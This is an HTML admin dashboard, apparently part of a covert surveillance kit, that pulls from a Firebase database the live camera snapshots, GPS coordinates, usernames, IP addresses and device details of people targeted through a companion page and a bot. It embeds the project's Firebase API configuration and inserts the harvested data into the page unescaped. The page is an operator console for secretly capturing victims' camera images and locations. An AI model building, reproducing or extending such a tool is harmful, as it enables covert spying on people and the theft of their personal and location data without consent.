<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Bot Data</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .admin-container {
            width: 100%;
            max-width: 800px;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .admin-options {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        .admin-btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .admin-btn:hover {
            background: #0077b3;
        }
        .clear-btn {
            background: #ff3333;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
        }
        .clear-btn:hover {
            background: #cc0000;
        }
        .content {
            background: #222;
            border-radius: 10px;
            padding: 10px;
            text-align: center;
        }
        .content img {
            width: 100%;
            display: block;
            border-radius: 5px;
        }
        .data-box {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            word-break: break-all;
            font-family: monospace;
            font-size: 13px;
            border: 1px dashed #ddd;
        }
        .error {
            color: #ff3333;
            background: #ffeeee;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>Admin - Bot Data</h1>
    <div class="admin-container">
        <div class="admin-options">
            <button class="admin-btn" onclick="showPhoto()">Photo</button>
            <button class="admin-btn" onclick="showData()">Data</button>
        </div>
        <div class="content" id="content">
            <p>Select an option above to view data.</p>
        </div>
    </div>

    <script>
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyD6EXA7D77rQDQEohB52BvTYimFeTEaAho",
            authDomain: "rn-gfx-tool.firebaseapp.com",
            databaseURL: "https://rn-gfx-tool-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "rn-gfx-tool",
            storageBucket: "rn-gfx-tool.firebasestorage.app",
            messagingSenderId: "163149358541",
            appId: "1:163149358541:android:2ef6d22fcd23e77ee09084"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const contentEl = document.getElementById('content');

        // Show live camera snapshot
        function showPhoto() {
            const photoRef = database.ref('liveCameraSnapshot');
            photoRef.on('value', (snapshot) => {
                const data = snapshot.val();
                if (data && data.photo) {
                    contentEl.innerHTML = `
                        <img src="${data.photo}" alt="Live Snapshot">
                        <p>Updated at: ${new Date(data.timestamp).toLocaleString()}</p>
                        <button class="clear-btn" onclick="clearData()">Clear Data</button>
                    `;
                } else {
                    contentEl.innerHTML = `
                        <div class="error">
                            No live snapshot available. Ensure the camera is running in index.html and permissions are granted.<br>
                            • Check if index.html is open and camera is active.<br>
                            • Verify Firebase rules allow read/write.<br>
                            • Open browser console (F12) for errors.
                        </div>
                        <button class="clear-btn" onclick="clearData()">Clear Data</button>
                    `;
                }
            }, (error) => {
                contentEl.innerHTML = `
                    <div class="error">
                        Error loading snapshot: ${error.message}
                    </div>
                `;
            });
        }

        // Show user data (location, details)
        function showData() {
            const dataRef = database.ref('userData');
            dataRef.on('value', (snapshot) => {
                const data = snapshot.val();
                let html = '';

                if (data) {
                    if (data.location) {
                        html += `
                            <div class="data-box">
                                <strong>Location:</strong><br>
                                Latitude: ${data.location.latitude}<br>
                                Longitude: ${data.location.longitude}<br>
                                <a href="${data.location.mapLink}" target="_blank">View on Map</a><br>
                                Updated at: ${new Date(data.location.timestamp).toLocaleString()}
                            </div>
                        `;
                    }
                    if (data.details) {
                        html += `
                            <div class="data-box">
                                <strong>Details:</strong><br>
                                Username: ${data.details.username}<br>
                                IP: ${data.details.ip}<br>
                                Device: ${data.details.device}<br>
                                Updated at: ${new Date(data.details.timestamp).toLocaleString()}
                            </div>
                        `;
                    }
                    if (!data.location && !data.details) {
                        html = `
                            <div class="error">
                                No user data available. Use the bot to share location or details.
                            </div>
                        `;
                    }
                } else {
                    html = `
                        <div class="error">
                            No user data available. Use the bot to share location or details.
                        </div>
                    `;
                }

                contentEl.innerHTML = html + `<button class="clear-btn" onclick="clearData()">Clear Data</button>`;
            }, (error) => {
                contentEl.innerHTML = `
                    <div class="error">
                        Error loading data: ${error.message}
                    </div>
                `;
            });
        }

        // Clear all data from Firebase
        function clearData() {
            database.ref('liveCameraSnapshot').remove();
            database.ref('userData').remove().then(() => {
                contentEl.innerHTML = `<p>Data cleared successfully.</p>`;
            }).catch(error => {
                contentEl.innerHTML = `
                    <div class="error">
                        Error clearing data: ${error.message}
                    </div>
                `;
            });
        }
    </script>
</body>
</html>
